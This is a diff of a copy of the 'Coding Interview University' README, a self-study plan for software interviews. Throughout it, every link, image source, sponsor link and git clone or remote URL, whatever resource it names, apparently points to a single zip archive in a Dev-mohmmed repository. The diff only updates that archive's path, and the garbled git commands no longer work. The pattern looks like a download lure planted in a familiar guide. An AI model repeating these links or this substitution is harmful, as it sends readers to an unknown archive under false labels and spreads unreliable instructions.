@@ -2,10 +2,10 @@
 
 > I originally created this as a short to-do list of study topics for becoming a software engineer,
 > but it grew to the large list you see today. After going through this study plan, [I got hired
-> as a Software Development Engineer at Amazon](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)!
+> as a Software Development Engineer at Amazon](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)!
 > You probably won't have to study as much as I did. Anyway, everything you need is here.
 >
-> I studied about 8-12 hours a day, for several months. This is my story: [Why I studied full-time for 8 months for a Google interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+> I studied about 8-12 hours a day, for several months. This is my story: [Why I studied full-time for 8 months for a Google interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 >
 > **Please Note:** You won't need to study as much as I did. I wasted a lot of time on things I didn't need to know. More info about that below. I'll help you get there without wasting your precious time.
 >
@@ -17,51 +17,51 @@
 <details>
 <summary>Translations:</summary>
 
-- [中文版本](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Tiếng Việt - Vietnamese](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Español](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Português Brasileiro](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Polish](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [繁體中文](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Japanese (日本語)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Russian](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [German](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Bahasa Indonesia](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ខ្មែរ - Khmer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Uzbek](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [中文版本](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Tiếng Việt - Vietnamese](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Español](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Português Brasileiro](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Polish](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [繁體中文](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Japanese (日本語)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Russian](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [German](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Bahasa Indonesia](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ខ្មែរ - Khmer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Uzbek](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 </details>
 
 <details>
 <summary>Translations in progress:</summary>
 
-- [हिन्दी](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [עברית](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Arabic](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Turkish](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [French](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Українська](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Korean(한국어)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Telugu](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Urdu](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Thai](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Greek](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Malayalam](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [हिन्दी](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [עברית](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Arabic](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Turkish](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [French](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Українська](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Korean(한국어)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Telugu](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Urdu](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Thai](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Greek](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Malayalam](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 </details>
 
 <div align="center">
 	<hr />
     <p>
-        <a href="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip"><strong>Become a sponsor</strong> and support Coding Interview University!</a>
+        <a href="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip"><strong>Become a sponsor</strong> and support Coding Interview University!</a>
     </p>
     <p>
         <strong>Special thanks to:</strong>
     </p>
     <p>
-        <a href="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip">
+        <a href="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip">
             <div>
-                <img src="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip" width="400"  alt="Simplify">
+                <img src="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip" width="400"  alt="Simplify">
             </div>
             <div>
                 <p>
@@ -75,9 +75,9 @@
     </p>
     <br />
     <p>
-        <a href="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip">
+        <a href="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip">
             <div>
-                <img src="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip" width="350" alt="OSS Capital">
+                <img src="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip" width="350" alt="OSS Capital">
             </div>
             <div>
                 <sup><strong>Founded in 2018, OSS Capital is the first and only venture capital platform focused<br>exclusively on supporting early-stage COSS (commercial open source) startup founders.</strong></sup>
@@ -86,9 +86,9 @@
     </p>
     <br />
     <p>
-        <a href="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip">
+        <a href="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip">
             <div>
-                <img src="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip" width="300" alt="Gitpod">
+                <img src="https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip" width="300" alt="Gitpod">
             </div>
             <div>
                 <p>
@@ -105,7 +105,7 @@
 
 ## What is it?
 
-![Coding at the whiteboard - from HBO's Silicon Valley](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+![Coding at the whiteboard - from HBO's Silicon Valley](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 This is my multi-month study plan for becoming a software engineer for a large company. 
 
@@ -273,13 +273,13 @@ I'm using GitHub's special markdown flavor, including tasks lists to track progr
 
     Fork a branch and follow the commands below
 
-Fork the GitHub repo https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip by clicking on the Fork button.
+Fork the GitHub repo https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip by clicking on the Fork button.
 
 Clone to your local repo:
 
-    git clone https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip<your_github_username>https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip
+    git clone https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip<your_github_username>https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip
     git checkout -b progress
-    git remote add jwasham https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip
+    git remote add jwasham https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip
     git fetch --all
 
 Mark all boxes with X after you completed your changes:
@@ -290,13 +290,13 @@ Mark all boxes with X after you completed your changes:
     git push --set-upstream origin progress
     git push --force
 
-[More about GitHub-flavored markdown](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+[More about GitHub-flavored markdown](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Don't feel you aren't smart enough
 
 - Successful software engineers are smart, but many have an insecurity that they aren't smart enough.
-- [The myth of the Genius Programmer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [It's Dangerous to Go Alone: Battling the Invisible Monsters in Tech](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [The myth of the Genius Programmer](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [It's Dangerous to Go Alone: Battling the Invisible Monsters in Tech](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## A Note About Video Resources
 
@@ -322,23 +322,23 @@ When I did the study plan, I used 2 languages for most of it: C and Python
     and algorithms in your bones. In higher level languages like Python or Java, these are hidden from you. In day to day work, that's terrific,
     but when you're learning how these low-level data structures are built, it's great to feel close to the metal.
     - C is everywhere. You'll see examples in books, lectures, videos, *everywhere* while you're studying.
-    - [The C Programming Language, Vol 2](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [The C Programming Language, Vol 2](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - This is a short book, but it will give you a great handle on the C language and if you practice it a little
             you'll quickly get proficient. Understanding C helps you understand how programs and memory work.
         - You don't need to go super deep in the book (or even finish it). Just get to where you're comfortable reading and writing in C.
-        - [Answers to questions in the book](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Answers to questions in the book](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 * Python: Modern and very expressive, I learned it because it's just super useful and also allows me to write less code in an interview.
 
 This is my preference. You do what you like, of course.
 
 You may not need it, but here are some sites for learning a new language:
-- [Exercism](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Codewars](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Codility](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [HackerEarth](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Sphere Online Judge (spoj)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Codechef](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Codeforces](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Exercism](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Codewars](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Codility](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [HackerEarth](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Sphere Online Judge (spoj)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Codechef](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Codeforces](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ### For your Coding Interview
 
@@ -354,15 +354,15 @@ You could also use these, but read around first. There may be caveats:
 - Ruby
 
 Here is an article I wrote about choosing a language for the interview: 
-[Pick One Language for the Coding Interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip).
-This is the original article my post was based on: https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip
+[Pick One Language for the Coding Interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip).
+This is the original article my post was based on: https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip
 
 You need to be very comfortable in the language and be knowledgeable.
 
 Read more about choices: 
-- [Choose the Right Language for Your Coding Interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Choose the Right Language for Your Coding Interview](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-[See language-specific resources here](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+[See language-specific resources here](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Books for Data Structures and Algorithms
 
@@ -372,38 +372,38 @@ Just choose one, in a language that you will be comfortable with. You'll be doin
 
 ### C
 
-- [Algorithms in C, Parts 1-5 (Bundle), 3rd Edition](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Algorithms in C, Parts 1-5 (Bundle), 3rd Edition](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Fundamentals, Data Structures, Sorting, Searching, and Graph Algorithms 
 
 ### Python
 
-- [Data Structures and Algorithms in Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Data Structures and Algorithms in Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - by Goodrich, Tamassia, Goldwasser
     - I loved this book. It covered everything and more.
     - Pythonic code
-    - my glowing book report: https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip
+    - my glowing book report: https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip
 
 ### Java
 
 Your choice:
 
 - Goodrich, Tamassia, Goldwasser
-    - [Data Structures and Algorithms in Java](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Data Structures and Algorithms in Java](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - Sedgewick and Wayne:
-    - [Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Free Coursera course that covers the book (taught by the authors!):
-        - [Algorithms I](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Algorithms II](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Algorithms I](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Algorithms II](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ### C++
 
 Your choice:
 
 - Goodrich, Tamassia, and Mount
-    - [Data Structures and Algorithms in C++, 2nd Edition](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Data Structures and Algorithms in C++, 2nd Edition](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - Sedgewick and Wayne
-    - [Algorithms in C++, Parts 1-4: Fundamentals, Data Structure, Sorting, Searching](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Algorithms in C++ Part 5: Graph Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Algorithms in C++, Parts 1-4: Fundamentals, Data Structure, Sorting, Searching](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Algorithms in C++ Part 5: Graph Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Interview Prep Books
 
@@ -412,21 +412,21 @@ but I bought more to give myself more practice. But I always do too much.
 
 I bought both of these. They gave me plenty of practice.
 
-- [Programming Interviews Exposed: Coding Your Way Through the Interview, 4th Edition](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Programming Interviews Exposed: Coding Your Way Through the Interview, 4th Edition](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Answers in C++ and Java
     - This is a good warm-up for Cracking the Coding Interview
     - Not too difficult. Most problems may be easier than what you'll see in an interview (from what I've read)
-- [Cracking the Coding Interview, 6th Edition](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Cracking the Coding Interview, 6th Edition](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - answers in Java
 
 ### If you have tons of extra time:
 
 Choose one:
 
-- [Elements of Programming Interviews (C++ version)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Elements of Programming Interviews in Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Elements of Programming Interviews (Java version)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Companion Project - Method Stub and Test Cases for Every Problem in the Book](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Elements of Programming Interviews (C++ version)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Elements of Programming Interviews in Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Elements of Programming Interviews (Java version)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Companion Project - Method Stub and Test Cases for Every Problem in the Book](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 ## Don't Make My Mistakes
 
@@ -441,7 +441,7 @@ through my notes and making flashcards, so I could review. I didn't need all of 
 
 Please, read so you won't make my mistakes:
 
-[Retaining Computer Science Knowledge](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip).
+[Retaining Computer Science Knowledge](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip).
 
 ### 2. Use Flashcards
 
@@ -450,13 +450,13 @@ Each card has different formatting. I made a mobile-first website, so I could re
 
 Make your own for free:
 
-- [Flashcards site repo](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Flashcards site repo](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 **I DON'T RECOMMEND using my flashcards.** There are too many and many of them are trivia that you don't need.
 
 But if you don't want to listen to me, here you go:
-- [My flash cards database (1200 cards)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip):
-- [My flash cards database (extreme - 1800 cards)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip):
+- [My flash cards database (1200 cards)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip):
+- [My flash cards database (extreme - 1800 cards)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip):
 
 Keep in mind I went overboard and have cards covering everything from assembly language and Python trivia to machine learning and statistics. 
 It's way too much for what's required.
@@ -465,11 +465,11 @@ It's way too much for what's required.
 same card and answer it several times correctly before you really know it. Repetition will put that knowledge deeper in
 your brain.
 
-An alternative to using my flashcard site is [Anki](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip), which has been recommended to me numerous times. 
+An alternative to using my flashcard site is [Anki](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip), which has been recommended to me numerous times. 
 It uses a repetition system to help you remember. It's user-friendly, available on all platforms and has a cloud sync system. 
 It costs $25 on iOS but is free on other platforms.
 
-My flashcard database in Anki format: https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip (thanks [@xiewenya](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)).
+My flashcard database in Anki format: https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip (thanks [@xiewenya](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)).
 
 Some students have mentioned formatting issues with white space that can be fixed by doing the following: open deck, edit card, click cards, select the "styling" radio button, add the member "white-space: pre;" to the card class.
 
@@ -515,9 +515,9 @@ Each day, take the next subject in the list, watch some videos about that subjec
 of that data structure or algorithm in the language you chose for this course.
 
 You can see my code here:
- - [C](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
- - [C++](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
- - [Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+ - [C](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+ - [C++](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+ - [Python](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 You don't need to memorize every algorithm. You just need to be able to understand it enough to be able to write your own implementation.
 
@@ -537,7 +537,7 @@ Why you need to practice doing programming problems:
 
 There is a great intro for methodical, communicative problem solving in an interview. You'll get this from the programming
 interview books, too, but I found this outstanding:
-[Algorithm design canvas](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+[Algorithm design canvas](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 Write code on a whiteboard or paper, not a computer. Test with some sample inputs. Then type it and test it out on a computer.
 
@@ -545,7 +545,7 @@ If you don't have a whiteboard at home, pick up a large drawing pad from an art 
 This is my "sofa whiteboard". I added the pen in the photo just for scale. If you use a pen, you'll wish you could erase. 
 Gets messy quick. **I use a pencil and eraser.**
 
-![my sofa whiteboard](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+![my sofa whiteboard](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 **Coding question practice is not about memorizing answers to programming problems.**
 
@@ -554,27 +554,27 @@ Gets messy quick. **I use a pencil and eraser.**
 Don't forget your key coding interview books [here](#interview-prep-books).
 
 Solving Problems:
-- [How to Find a Solution](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [How to Dissect a Topcoder Problem Statement](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [How to Find a Solution](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [How to Dissect a Topcoder Problem Statement](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 Coding Interview Question Videos:
-- [IDeserve (88 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [Tushar Roy (5 playlists)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [IDeserve (88 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [Tushar Roy (5 playlists)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Super for walkthroughs of problem solutions
-- [Nick White - LeetCode Solutions (187 Videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [Nick White - LeetCode Solutions (187 Videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - Good explanations of solution and the code
     - You can watch several in a short time
-- [FisherCoder - LeetCode Solutions](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [FisherCoder - LeetCode Solutions](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 Challenge sites:
-- [LeetCode](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [LeetCode](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - My favorite coding problem site. It's worth the subscription money for the 1-2 months you'll likely be preparing.
